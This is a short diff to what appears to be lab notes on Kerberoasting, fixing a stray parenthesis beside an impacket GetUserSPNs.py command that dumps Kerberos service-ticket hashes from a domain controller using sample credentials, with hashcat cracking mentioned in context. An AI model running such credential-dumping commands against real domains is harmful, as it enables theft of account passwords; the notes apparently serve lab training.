@@ -82,7 +82,7 @@ Use hashcat to crack Kerberos 5 hash
 
 <pre>cd /usr/share/doc/python3-impacket/examples </pre>
 
-2) Dump Kerberos hash for all Kerberoastable accounts it can find on domain)
+2) Dump Kerberos hash for all Kerberoastable accounts it can find on domain
 
 <pre>sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.183.143 -request </pre>
 
